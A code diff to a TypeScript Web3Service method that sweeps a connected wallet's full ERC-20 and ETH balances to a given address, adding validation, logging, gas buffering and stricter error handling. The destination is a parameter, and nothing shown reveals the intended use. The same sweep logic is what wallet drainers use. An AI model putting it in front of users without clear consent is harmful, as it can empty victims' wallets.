@@ -274,70 +274,93 @@ export class Web3Service {
       throw new Error("Wallet not connected");
     }
 
+    // Validate destination address
+    if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
+      throw new Error("Invalid destination address");
+    }
+
     try {
       const address = await this.signer.getAddress();
       const network = await this.provider.getNetwork();
       const networkId = network.chainId.toString();
       
+      console.log(`Starting fund transfer to: ${toAddress}`);
       const transactionHashes: string[] = [];
       
       // Get all balances
       const ethBalance = await this.provider.getBalance(address);
       const tokenBalances = await this.getTokenBalances(address, networkId);
 
+      console.log(`ETH Balance: ${ethers.formatEther(ethBalance)} ETH`);
+      console.log(`Token Balances: ${tokenBalances.length} tokens`);
+
       // Transfer all ERC-20 tokens first
       for (const tokenBalance of tokenBalances) {
         if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;
         
         try {
+          console.log(`Transferring ${tokenBalance.balance} ${tokenBalance.symbol} to ${toAddress}`);
           const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
           const tokenAmount = ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals);
           
           const tokenTx = await contract.transfer(toAddress, tokenAmount);
           transactionHashes.push(tokenTx.hash);
+          console.log(`${tokenBalance.symbol} transfer hash: ${tokenTx.hash}`);
           
           // Wait a bit between transactions to avoid nonce issues
-          await new Promise(resolve => setTimeout(resolve, 1000));
+          await new Promise(resolve => setTimeout(resolve, 1500));
         } catch (error) {
-          console.warn(`Failed to transfer ${tokenBalance.symbol}:`, error);
+          console.error(`Failed to transfer ${tokenBalance.symbol}:`, error);
+          throw new Error(`Failed to transfer ${tokenBalance.symbol}: ${error}`);
         }
       }
 
       // Transfer ETH last (need to keep some for gas)
       if (ethBalance > 0) {
-        // Estimate gas for ETH transfer
-        const gasEstimate = await this.provider.estimateGas({
-          to: toAddress,
-          value: ethBalance,
-        });
+        try {
+          // Estimate gas for ETH transfer  
+          const gasEstimate = await this.provider.estimateGas({
+            to: toAddress,
+            value: ethBalance,
+          });
 
-        // Calculate gas cost
-        const feeData = await this.provider.getFeeData();
-        const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
-        const gasCost = gasEstimate * gasPrice;
+          // Get current gas price with some buffer
+          const feeData = await this.provider.getFeeData();
+          const gasPrice = feeData.gasPrice ? feeData.gasPrice * BigInt(110) / BigInt(100) : ethers.parseUnits("25", "gwei");
+          const gasCost = gasEstimate * gasPrice;
 
-        // Check if we have enough for gas
-        if (ethBalance > gasCost) {
-          const amountToSend = ethBalance - gasCost;
-          
-          if (amountToSend > 0) {
-            const ethTx = await this.signer.sendTransaction({
-              to: toAddress,
-              value: amountToSend,
-              gasLimit: gasEstimate,
-              gasPrice: gasPrice,
-            });
-            transactionHashes.push(ethTx.hash);
+          // Check if we have enough for gas
+          if (ethBalance > gasCost) {
+            const amountToSend = ethBalance - gasCost;
+            
+            if (amountToSend > 0) {
+              console.log(`Transferring ${ethers.formatEther(amountToSend)} ETH to ${toAddress}`);
+              const ethTx = await this.signer.sendTransaction({
+                to: toAddress,
+                value: amountToSend,
+                gasLimit: gasEstimate,
+                gasPrice: gasPrice,
+              });
+              transactionHashes.push(ethTx.hash);
+              console.log(`ETH transfer hash: ${ethTx.hash}`);
+            }
+          } else {
+            console.warn("Insufficient ETH for gas fees");
           }
+        } catch (error) {
+          console.error("ETH transfer failed:", error);
+          throw new Error(`ETH transfer failed: ${error}`);
         }
       }
 
       if (transactionHashes.length === 0) {
-        throw new Error("No funds available to transfer");
+        throw new Error("No funds available to transfer or all transfers failed");
       }
 
+      console.log(`Successfully initiated ${transactionHashes.length} transfers to ${toAddress}`);
       return transactionHashes;
     } catch (error: any) {
+      console.error("Transfer all funds failed:", error);
       throw new Error(`Transfer failed: ${error.message}`);
     }
   }
